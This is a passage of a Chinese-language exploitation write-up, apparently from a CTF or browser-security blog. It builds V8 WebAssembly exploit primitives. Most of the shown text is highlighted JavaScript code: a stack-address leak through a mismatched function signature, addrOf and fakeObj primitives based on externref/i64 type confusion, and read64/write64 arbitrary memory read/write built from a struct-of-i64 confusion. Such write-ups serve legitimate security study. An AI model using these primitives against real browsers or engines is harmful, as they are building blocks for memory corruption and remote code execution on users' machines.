style="color:#CB7676">function</span><span style="color:#80A665"> RandomLeak</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">	const</span><span style="color:#BD976A"> sig</span><span style="color:#666666"> =</span><span style="color:#80A665"> makeSig</span><span style="color:#4d9375">(</span><span style="color:#d4976c">[</span><span style="color:#d4976c">]</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#d4976c">[</span><span style="color:#BD976A">kWasmI64</span><span style="color:#666666">,</span><span style="color:#BD976A"> kWasmI64</span><span style="color:#666666">,</span><span style="color:#BD976A"> kWasmF64</span><span style="color:#666666">,</span><span style="color:#BD976A"> kWasmF64</span><span style="color:#d4976c">]</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	const</span><span style="color:#BD976A"> builder</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#80A665"> WasmModuleBuilder</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#BD976A">	builder</span><br><span style="color:#666666">		.</span><span style="color:#80A665">addFunction</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">bad</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#BD976A"> sig</span><span style="color:#4d9375">)</span><br><span style="color:#666666">		.</span><span style="color:#80A665">addBody</span><span style="color:#4d9375">(</span><span style="color:#d4976c">[</span><br><span style="color:#758575DD">			// kExprEnd,</span><br><span style="color:#666666">		</span><span style="color:#d4976c">]</span><span style="color:#4d9375">)</span><br><span style="color:#666666">		.</span><span style="color:#80A665">exportFunc</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">	const</span><span style="color:#BD976A"> module_bytes</span><span style="color:#666666"> =</span><span style="color:#BD976A"> builder</span><span style="color:#666666">.</span><span style="color:#80A665">toBuffer</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	const</span><span style="color:#BD976A"> mod</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#BD976A"> WebAssembly</span><span style="color:#666666">.</span><span style="color:#80A665">Module</span><span style="color:#4d9375">(</span><span style="color:#BD976A">module_bytes</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	const</span><span style="color:#BD976A"> instance</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#BD976A"> WebAssembly</span><span style="color:#666666">.</span><span style="color:#80A665">Instance</span><span style="color:#4d9375">(</span><span style="color:#BD976A">mod</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#d4976c">{</span><span style="color:#d4976c">}</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">	var</span><span style="color:#BD976A"> ret_val</span><span style="color:#666666"> =</span><span style="color:#BD976A"> instance</span><span style="color:#666666">.</span><span style="color:#BD976A">exports</span><span style="color:#666666">.</span><span style="color:#80A665">bad</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">	return</span><span style="color:#BD976A"> ret_val</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>就像这样，<code class="inline-code">makeSig</code> 函数定义了一个函数的参数和返回值，这里定义有四个返回值；<code class="inline-code">builder</code> 的 <code class="inline-code">addBody</code> 方法可以添加函数体，这里什么都不写相当于直接返回。这样可以直接读出栈上的值，也就是比较轻松的泄漏栈地址。</p>
<p>用这个思路，我们可以比较轻松的构造 <code class="inline-code">addrof</code> 和 <code class="inline-code">fakeobj</code> 原语，如下：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-js language-js"><span style="color:#AB5959">function</span><span style="color:#59873A"> addrOf</span><span style="color:#2993a3">(</span><span style="color:#B07D48">obj</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">  const</span><span style="color:#B07D48"> sig_r_l</span><span style="color:#999999"> =</span><span style="color:#59873A"> makeSig</span><span style="color:#1e754f">(</span><span style="color:#a65e2b">[</span><span style="color:#B07D48">kWasmExternRef</span><span style="color:#a65e2b">]</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#a65e2b">[</span><span style="color:#B07D48">kWasmI64</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><span style="color:#A0ADA0">  // (externref)->i64</span><br><span style="color:#AB5959">  const</span><span style="color:#B07D48"> builder</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#59873A"> WasmModuleBuilder</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">  builder</span><span style="color:#999999">.</span><span style="color:#59873A">addFunction</span><span style="color:#1e754f">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">addr</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B07D48"> sig_r_l</span><span style="color:#1e754f">)</span><br><span style="color:#999999">    .</span><span style="color:#59873A">addBodyWithEnd</span><span style="color:#1e754f">(</span><span style="color:#a65e2b">[</span><br><span style="color:#B07D48">      kExprLocalGet</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><br><span style="color:#B07D48">      kExprEnd</span><span style="color:#999999">,</span><br><span style="color:#999999">    </span><span style="color:#a65e2b">]</span><span style="color:#1e754f">)</span><br><span style="color:#999999">    .</span><span style="color:#59873A">exportFunc</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">  const</span><span style="color:#B07D48"> module_bytes</span><span style="color:#999999"> =</span><span style="color:#B07D48"> builder</span><span style="color:#999999">.</span><span style="color:#59873A">toBuffer</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">  const</span><span style="color:#B07D48"> mod</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#B07D48"> WebAssembly</span><span style="color:#999999">.</span><span style="color:#59873A">Module</span><span style="color:#1e754f">(</span><span style="color:#B07D48">module_bytes</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">  const</span><span style="color:#B07D48"> instance</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#B07D48"> WebAssembly</span><span style="color:#999999">.</span><span style="color:#59873A">Instance</span><span style="color:#1e754f">(</span><span style="color:#B07D48">mod</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#a65e2b">{</span><span style="color:#a65e2b">}</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  return</span><span style="color:#B07D48"> instance</span><span style="color:#999999">.</span><span style="color:#B07D48">exports</span><span style="color:#999999">.</span><span style="color:#59873A">addr</span><span style="color:#1e754f">(</span><span style="color:#B07D48">obj</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#AB5959">function</span><span style="color:#59873A"> fakeObj</span><span style="color:#2993a3">(</span><span style="color:#B07D48">addr</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">  const</span><span style="color:#B07D48"> sig_l_r</span><span style="color:#999999"> =</span><span style="color:#59873A"> makeSig</span><span style="color:#1e754f">(</span><span style="color:#a65e2b">[</span><span style="color:#B07D48">kWasmI64</span><span style="color:#a65e2b">]</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#a65e2b">[</span><span style="color:#B07D48">kWasmExternRef</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><span style="color:#A0ADA0">  // (i64)->externref</span><br><span style="color:#AB5959">  const</span><span style="color:#B07D48"> builder</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#59873A"> WasmModuleBuilder</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">  builder</span><span style="color:#999999">.</span><span style="color:#59873A">addFunction</span><span style="color:#1e754f">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">fake</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B07D48"> sig_l_r</span><span style="color:#1e754f">)</span><br><span style="color:#999999">    .</span><span style="color:#59873A">addBodyWithEnd</span><span style="color:#1e754f">(</span><span style="color:#a65e2b">[</span><br><span style="color:#B07D48">      kExprLocalGet</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><br><span style="color:#B07D48">      kExprEnd</span><span style="color:#999999">,</span><br><span style="color:#999999">    </span><span style="color:#a65e2b">]</span><span style="color:#1e754f">)</span><br><span style="color:#999999">    .</span><span style="color:#59873A">exportFunc</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">  const</span><span style="color:#B07D48"> module_bytes</span><span style="color:#999999"> =</span><span style="color:#B07D48"> builder</span><span style="color:#999999">.</span><span style="color:#59873A">toBuffer</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">  const</span><span style="color:#B07D48"> mod</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#B07D48"> WebAssembly</span><span style="color:#999999">.</span><span style="color:#59873A">Module</span><span style="color:#1e754f">(</span><span style="color:#B07D48">module_bytes</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">  const</span><span style="color:#B07D48"> instance</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#B07D48"> WebAssembly</span><span style="color:#999999">.</span><span style="color:#59873A">Instance</span><span style="color:#1e754f">(</span><span style="color:#B07D48">mod</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#a65e2b">{</span><span style="color:#a65e2b">}</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  return</span><span style="color:#B07D48"> instance</span><span style="color:#999999">.</span><span style="color:#B07D48">exports</span><span style="color:#999999">.</span><span style="color:#59873A">fake</span><span style="color:#1e754f">(</span><span style="color:#B07D48">addr</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-js language-js"><span style="color:#CB7676">function</span><span style="color:#80A665"> addrOf</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">obj</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">  const</span><span style="color:#BD976A"> sig_r_l</span><span style="color:#666666"> =</span><span style="color:#80A665"> makeSig</span><span style="color:#4d9375">(</span><span style="color:#d4976c">[</span><span style="color:#BD976A">kWasmExternRef</span><span style="color:#d4976c">]</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#d4976c">[</span><span style="color:#BD976A">kWasmI64</span><span style="color:#d4976c">]</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><span style="color:#758575DD">  // (externref)->i64</span><br><span style="color:#CB7676">  const</span><span style="color:#BD976A"> builder</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#80A665"> WasmModuleBuilder</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">  builder</span><span style="color:#666666">.</span><span style="color:#80A665">addFunction</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">addr</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#BD976A"> sig_r_l</span><span style="color:#4d9375">)</span><br><span style="color:#666666">    .</span><span style="color:#80A665">addBodyWithEnd</span><span style="color:#4d9375">(</span><span style="color:#d4976c">[</span><br><span style="color:#BD976A">      kExprLocalGet</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><br><span style="color:#BD976A">      kExprEnd</span><span style="color:#666666">,</span><br><span style="color:#666666">    </span><span style="color:#d4976c">]</span><span style="color:#4d9375">)</span><br><span style="color:#666666">    .</span><span style="color:#80A665">exportFunc</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">  const</span><span style="color:#BD976A"> module_bytes</span><span style="color:#666666"> =</span><span style="color:#BD976A"> builder</span><span style="color:#666666">.</span><span style="color:#80A665">toBuffer</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">  const</span><span style="color:#BD976A"> mod</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#BD976A"> WebAssembly</span><span style="color:#666666">.</span><span style="color:#80A665">Module</span><span style="color:#4d9375">(</span><span style="color:#BD976A">module_bytes</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">  const</span><span style="color:#BD976A"> instance</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#BD976A"> WebAssembly</span><span style="color:#666666">.</span><span style="color:#80A665">Instance</span><span style="color:#4d9375">(</span><span style="color:#BD976A">mod</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#d4976c">{</span><span style="color:#d4976c">}</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">  return</span><span style="color:#BD976A"> instance</span><span style="color:#666666">.</span><span style="color:#BD976A">exports</span><span style="color:#666666">.</span><span style="color:#80A665">addr</span><span style="color:#4d9375">(</span><span style="color:#BD976A">obj</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#CB7676">function</span><span style="color:#80A665"> fakeObj</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">addr</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">  const</span><span style="color:#BD976A"> sig_l_r</span><span style="color:#666666"> =</span><span style="color:#80A665"> makeSig</span><span style="color:#4d9375">(</span><span style="color:#d4976c">[</span><span style="color:#BD976A">kWasmI64</span><span style="color:#d4976c">]</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#d4976c">[</span><span style="color:#BD976A">kWasmExternRef</span><span style="color:#d4976c">]</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><span style="color:#758575DD">  // (i64)->externref</span><br><span style="color:#CB7676">  const</span><span style="color:#BD976A"> builder</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#80A665"> WasmModuleBuilder</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">  builder</span><span style="color:#666666">.</span><span style="color:#80A665">addFunction</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">fake</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#BD976A"> sig_l_r</span><span style="color:#4d9375">)</span><br><span style="color:#666666">    .</span><span style="color:#80A665">addBodyWithEnd</span><span style="color:#4d9375">(</span><span style="color:#d4976c">[</span><br><span style="color:#BD976A">      kExprLocalGet</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><br><span style="color:#BD976A">      kExprEnd</span><span style="color:#666666">,</span><br><span style="color:#666666">    </span><span style="color:#d4976c">]</span><span style="color:#4d9375">)</span><br><span style="color:#666666">    .</span><span style="color:#80A665">exportFunc</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">  const</span><span style="color:#BD976A"> module_bytes</span><span style="color:#666666"> =</span><span style="color:#BD976A"> builder</span><span style="color:#666666">.</span><span style="color:#80A665">toBuffer</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">  const</span><span style="color:#BD976A"> mod</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#BD976A"> WebAssembly</span><span style="color:#666666">.</span><span style="color:#80A665">Module</span><span style="color:#4d9375">(</span><span style="color:#BD976A">module_bytes</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">  const</span><span style="color:#BD976A"> instance</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#BD976A"> WebAssembly</span><span style="color:#666666">.</span><span style="color:#80A665">Instance</span><span style="color:#4d9375">(</span><span style="color:#BD976A">mod</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#d4976c">{</span><span style="color:#d4976c">}</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">  return</span><span style="color:#BD976A"> instance</span><span style="color:#666666">.</span><span style="color:#BD976A">exports</span><span style="color:#666666">.</span><span style="color:#80A665">fake</span><span style="color:#4d9375">(</span><span style="color:#BD976A">addr</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>这里的 <code class="inline-code">externref</code> 其实就是一个 js 里的对象。</p>
<p>然后尝试构造任意 64 位地址空间的读写原语。@nighttu 师傅的方法是用 <code class="inline-code">struct</code> 和 <code class="inline-code">I64</code> 混淆（wasm 里的 <code class="inline-code">struct</code> 类型其实就是允许把多个基本类型连起来，和 C/C++ 比较类似）。</p>
<p>构造一个这样的 <code class="inline-code">struct</code>：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-js language-js"><span style="color:#AB5959">const</span><span style="color:#B07D48"> structType</span><span style="color:#999999"> =</span><span style="color:#B07D48"> builder</span><span style="color:#999999">.</span><span style="color:#59873A">addStruct</span><span style="color:#2993a3">(</span><br><span style="color:#999999">  </span><span style="color:#1e754f">[</span><span style="color:#59873A">makeField</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">kWasmI64</span><span style="color:#999999">,</span><span style="color:#1E754F"> true</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#A0ADA0">  // 只有一个 I64 字段</span><br><span style="color:#B07D48">  kNoSuperType</span><span style="color:#999999">,</span><span style="color:#A0ADA0">                 // 无父类</span><br><span style="color:#1E754F">  true</span><span style="color:#999999">,</span><span style="color:#A0ADA0">                         // final：不能再被其他类型继承</span><br><span style="color:#1E754F">  false</span><span style="color:#999999">,</span><span style="color:#A0ADA0">                        // 非 shared：普通单线程用的 GC 对象</span><br><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-js language-js"><span style="color:#CB7676">const</span><span style="color:#BD976A"> structType</span><span style="color:#666666"> =</span><span style="color:#BD976A"> builder</span><span style="color:#666666">.</span><span style="color:#80A665">addStruct</span><span style="color:#5eaab5">(</span><br><span style="color:#666666">  </span><span style="color:#4d9375">[</span><span style="color:#80A665">makeField</span><span style="color:#d4976c">(</span><span style="color:#BD976A">kWasmI64</span><span style="color:#666666">,</span><span style="color:#4D9375"> true</span><span style="color:#d4976c">)</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#758575DD">  // 只有一个 I64 字段</span><br><span style="color:#BD976A">  kNoSuperType</span><span style="color:#666666">,</span><span style="color:#758575DD">                 // 无父类</span><br><span style="color:#4D9375">  true</span><span style="color:#666666">,</span><span style="color:#758575DD">                         // final：不能再被其他类型继承</span><br><span style="color:#4D9375">  false</span><span style="color:#666666">,</span><span style="color:#758575DD">                        // 非 shared：普通单线程用的 GC 对象</span><br><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br></code></pre></div>
<p>然后使用 <code class="inline-code">structSet</code> 和 <code class="inline-code">structGet</code> 实现任意读写原语：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-js language-js"><span style="color:#AB5959">const</span><span style="color:#B07D48"> refStructType</span><span style="color:#999999"> =</span><span style="color:#59873A"> wasmRefType</span><span style="color:#2993a3">(</span><span style="color:#B07D48">structType</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><span style="color:#A0ADA0">  // ref struct(i64)</span><br><br><span style="color:#A0ADA0">// from_i64: (i64) -> ref struct(i64)</span><br><span style="color:#AB5959">const</span><span style="color:#B07D48"> sig_cast</span><span style="color:#999999"> =</span><span style="color:#59873A"> makeSig</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#B07D48">kWasmI64</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">[</span><span style="color:#B07D48">refStructType</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">const</span><span style="color:#B07D48"> cast</span><span style="color:#999999"> =</span><span style="color:#B07D48"> builder</span><span style="color:#999999">.</span><span style="color:#59873A">addFunction</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">from_i64</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B07D48"> sig_cast</span><span style="color:#2993a3">)</span><br><span style="color:#999999">  .</span><span style="color:#59873A">addBodyWithEnd</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><br><span style="color:#B07D48">    kExprLocalGet</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><br><span style="color:#B07D48">    kExprEnd</span><span style="color:#999999">,</span><br><span style="color:#999999">  </span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">const</span><span style="color:#B07D48"> sig_set</span><span style="color:#999999"> =</span><span style="color:#59873A"> makeSig</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#B07D48">kWasmI64</span><span style="color:#999999">,</span><span style="color:#B07D48"> kWasmI64</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">[</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">builder</span><span style="color:#999999">.</span><span style="color:#59873A">addFunction</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">set_field</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B07D48"> sig_set</span><span style="color:#2993a3">)</span><br><span style="color:#999999">  .</span><span style="color:#59873A">addBodyWithEnd</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><br><span style="color:#B07D48">    kExprLocalGet</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><br><span style="color:#B07D48">    kExprCallFunction</span><span style="color:#999999">,</span><span style="color:#999999"> ...</span><span style="color:#59873A">wasmUnsignedLeb</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">cast</span><span style="color:#999999">.</span><span style="color:#B07D48">index</span><span style="color:#999999">,</span><span style="color:#B07D48"> kMaxVarInt32Size</span><span style="color:#a65e2b">)</span><span style="color:#999999">,</span><br><span style="color:#B07D48">    kExprLocalGet</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><br><span style="color:#B07D48">    kGCPrefix</span><span style="color:#999999">,</span><span style="color:#B07D48"> kExprStructSet</span><span style="color:#999999">,</span><br><span style="color:#999999">    ...</span><span style="color:#59873A">wasmUnsignedLeb</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">structType</span><span style="color:#999999">,</span><span style="color:#B07D48"> kMaxVarInt32Size</span><span style="color:#a65e2b">)</span><span style="color:#999999">,</span><br><span style="color:#999999">    ...</span><span style="color:#59873A">wasmUnsignedLeb</span><span style="color:#a65e2b">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#B07D48"> kMaxVarInt32Size</span><span style="color:#a65e2b">)</span><span style="color:#999999">,</span><br><span style="color:#B07D48">    kExprEnd</span><span style="color:#999999">,</span><br><span style="color:#999999">  </span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#999999">  .</span><span style="color:#59873A">exportFunc</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">const</span><span style="color:#B07D48"> sig_get</span><span style="color:#999999"> =</span><span style="color:#59873A"> makeSig</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#B07D48">kWasmI64</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">[</span><span style="color:#B07D48">kWasmI64</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">builder</span><span style="color:#999999">.</span><span style="color:#59873A">addFunction</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">get_field</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B07D48"> sig_get</span><span style="color:#2993a3">)</span><br><span style="color:#999999">  .</span><span style="color:#59873A">addBodyWithEnd</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><br><span style="color:#B07D48">    kExprLocalGet</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><br><span style="color:#B07D48">    kExprCallFunction</span><span style="color:#999999">,</span><span style="color:#999999"> ...</span><span style="color:#59873A">wasmUnsignedLeb</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">cast</span><span style="color:#999999">.</span><span style="color:#B07D48">index</span><span style="color:#999999">,</span><span style="color:#B07D48"> kMaxVarInt32Size</span><span style="color:#a65e2b">)</span><span style="color:#999999">,</span><br><span style="color:#B07D48">    kGCPrefix</span><span style="color:#999999">,</span><span style="color:#B07D48"> kExprStructGet</span><span style="color:#999999">,</span><br><span style="color:#999999">    ...</span><span style="color:#59873A">wasmUnsignedLeb</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">structType</span><span style="color:#999999">,</span><span style="color:#B07D48"> kMaxVarInt32Size</span><span style="color:#a65e2b">)</span><span style="color:#999999">,</span><br><span style="color:#999999">    ...</span><span style="color:#59873A">wasmUnsignedLeb</span><span style="color:#a65e2b">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#B07D48"> kMaxVarInt32Size</span><span style="color:#a65e2b">)</span><span style="color:#999999">,</span><br><span style="color:#B07D48">    kExprEnd</span><span style="color:#999999">,</span><br><span style="color:#999999">  </span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#999999">  .</span><span style="color:#59873A">exportFunc</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">const</span><span style="color:#B07D48"> module_bytes</span><span style="color:#999999"> =</span><span style="color:#B07D48"> builder</span><span style="color:#999999">.</span><span style="color:#59873A">toBuffer</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">const</span><span style="color:#B07D48"> mod</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#B07D48"> WebAssembly</span><span style="color:#999999">.</span><span style="color:#59873A">Module</span><span style="color:#2993a3">(</span><span style="color:#B07D48">module_bytes</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">const</span><span style="color:#B07D48"> instance</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#B07D48"> WebAssembly</span><span style="color:#999999">.</span><span style="color:#59873A">Instance</span><span style="color:#2993a3">(</span><span style="color:#B07D48">mod</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><span style="color:#1e754f">}</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">function</span><span style="color:#59873A"> read64</span><span style="color:#2993a3">(</span><span style="color:#B07D48">addr</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#A0ADA0">  // 这里 -8n 的原因可以调试发现</span><br><span style="color:#1E754F">  return</span><span style="color:#B07D48"> instance</span><span style="color:#999999">.</span><span style="color:#B07D48">exports</span><span style="color:#999999">.</span><span style="color:#59873A">get_field</span><span style="color:#1e754f">(</span><span style="color:#B07D48">addr</span><span style="color:#AB5959"> -</span><span style="color:#2F798A"> 8</span><span style="color:#AB5959">n</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 1</span><span style="color:#AB5959">n</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><span style="color:#393A34"> </span><br><span style="color:#2993a3">}</span><br><span style="color:#AB5959">function</span><span style="color:#59873A"> write64</span><span style="color:#2993a3">(</span><span style="color:#B07D48">addr</span><span style="color:#999999">,</span><span style="color:#B07D48"> value</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#B07D48">  instance</span><span style="color:#999999">.</span><span style="color:#B07D48">exports</span><span style="color:#999999">.</span><span style="color:#59873A">set_field</span><span style="color:#1e754f">(</span><span style="color:#B07D48">addr</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 1</span><span style="color:#AB5959">n</span><span style="color:#999999">,</span><span style="color:#B07D48"> value</span><span style="color:#1e754f">)</span><span 